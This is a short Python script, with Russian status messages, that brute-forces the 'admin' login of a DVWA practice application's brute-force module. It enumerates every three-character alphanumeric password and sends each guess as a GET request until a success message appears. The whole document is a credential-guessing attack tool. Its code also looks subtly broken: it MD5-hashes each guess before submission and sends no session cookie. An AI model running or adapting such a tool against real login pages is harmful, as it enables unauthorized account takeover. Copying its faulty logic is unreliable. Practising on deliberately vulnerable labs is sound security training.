import requests
import hashlib
url = 'https://dvwa.exp-9.com/vulnerabilities/brute/'
def brute_force_password(user, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    payload = {'username': user, 'password': password_hash}
    response = requests.get(url, params=payload)
    if "Welcome to the password protected area" in response.text:
        print(f"Пароль найден: {password}")
        return True
    else:
        print(f"Неверный пароль: {password}")
    return False


def generate_passwords(length, chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
    if length == 0:
        return ['']
    passwords = []
    for char in chars:
        for password in generate_passwords(length - 1, chars):
            passwords.append(char + password)
    return passwords


user = 'admin'
password_length = 3
for password in generate_passwords(password_length):
    if brute_force_password(user, password):
        break
